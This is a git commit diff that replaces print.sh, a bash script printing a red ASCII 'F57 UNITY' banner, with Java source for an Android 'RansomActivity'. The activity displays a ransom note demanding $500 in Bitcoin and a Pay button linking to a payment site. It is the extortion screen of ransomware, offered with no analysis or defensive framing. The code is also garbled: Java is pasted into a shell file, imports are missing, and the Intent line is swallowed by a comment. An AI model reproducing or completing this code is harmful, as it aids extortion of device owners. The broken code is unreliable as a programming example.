db032f405cd679ebc2811ab5448ce98e1ed871ce
LVIIF57 <Charon.IIXV@protonmail.com>
2024-06-05 19:57:06 +0200

    Update print.sh

--- print.sh
+++ print.sh
@@ -1,26 +1,18 @@
-#!/bin/bash
+RansomActivity.java:
 
-# Stampa un'animazione di testo a video in console che rappresenta lo stemma F57 UNITY animato
-echo -e "\033[31m#####     #       #       ##     #     #  #######  #       #   #  #####  ####### \033[0m"
-echo -e "\033[31m#       #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#       #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#####     #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#          #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#          #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#####     #######  #######  #######     #       #######  #######  #######  ####### \033[0m"
-echo -e "\033[31m                                                           \033[0m"
-echo -e "\033[31m                                                           \033[0m"
-echo -e "\033[31m#####     #       #       ##     #     #  #######  #       #   #  #####  ####### \033[0m"
-echo -e "\033[31m#       #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#       #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#       #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#       #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#####     #######  #######  #######     #       #######  #######  #######  ####### \033[0m"
-echo -e "\033[31m                                                           \033[0m"
-echo -e "\033[31m                                                           \033[0m"
-echo -e "\033[31m#####     #       #       ##     #     #  #######  #       #   #  #####  ####### \033[0m"
-echo -e "\033[31m#       #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#       #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#       #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#       #       #       #  #    #     #       #    #       #       #  #     #     # \033[0m"
-echo -e "\033[31m#####     #######  #######  #######     #       #######  #######  #######  ####### \033[0m"
+import android.os.Bundle;import android.view.View;
+import android.widget.Button;import android.widget.TextView;
+import androidx.appcompat.app.AppCompatActivity;
+public class RansomActivity extends AppCompatActivity {
+    private static final String TAG = "RansomActivity";
+    @Override    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_ransom);
+        // Get message TextView and set text
+        TextView messageTextView = findViewById(R.id.messageTextView);        messageTextView.setText("Your files have been encrypted. Pay $500 in Bitcoin to get the decryption key.");
+        // Get Pay button and set click listener
+        Button payButton = findViewById(R.id.payButton);        payButton.setOnClickListener(new View.OnClickListener() {
+            @Override            public void onClick(View v) {
+                // Redirect user to a website where they can pay the ransom                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.bitcoin.com"));
+                startActivity(intent);            }
+        });    }
+}
